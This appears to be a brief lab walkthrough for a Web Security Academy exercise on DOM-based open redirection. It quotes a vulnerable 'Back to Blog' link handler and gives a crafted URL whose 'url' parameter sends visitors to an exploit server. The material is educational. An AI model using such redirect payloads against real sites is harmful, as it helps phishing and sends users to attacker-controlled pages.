Choosing a post and reading the source code, we will see the code:
```
<div class="is-linkback">
                        <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```
Therefore we will create a link to solve the lab:
```
https://<ID Lab>.web-security-academy.net/post?postId=9&url=https://exploit-<ID exploit server>.exploit-server.net/
```
